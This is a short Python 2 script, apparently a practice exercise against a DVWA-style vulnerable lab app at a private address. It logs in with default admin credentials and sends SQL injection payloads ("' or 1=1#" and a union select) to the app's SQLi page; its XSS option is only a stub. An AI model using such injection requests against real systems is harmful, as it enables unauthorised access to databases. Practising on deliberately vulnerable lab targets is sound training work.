import urllib, urllib2, cookielib

username = 'admin'
password = 'password'

payload = urllib.quote_plus("' or 1=1#")
payload2= urllib.quote_plus("1' and 1=1 union select 1,2#")
sufix = "&Submit=Submit#"

menu = {}
menu['1']="SQLi"
menu['2']="XSS"
menu['3']="Exit"
while True:
  options=menu.keys()
  options.sort()
  for entry in options:
	print entry, menu[entry]

  selection = raw_input("Please select:")
  if selection == '1':
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	login_data = urllib.urlencode({'username' : username, 'password' : password})
	opener.open('http://192.168.57.100/index.php', login_data)
	resp = opener.open('http://192.168.57.100/vulnerabilities/sqli/?id='+payload2+sufix)
	print resp.read()
	break
  elif selection == '2':
	print "XSS script now needs to run"
  elif selection == '3':
	break
  else:
	print "Unknown option selected!"


#print resp.read()
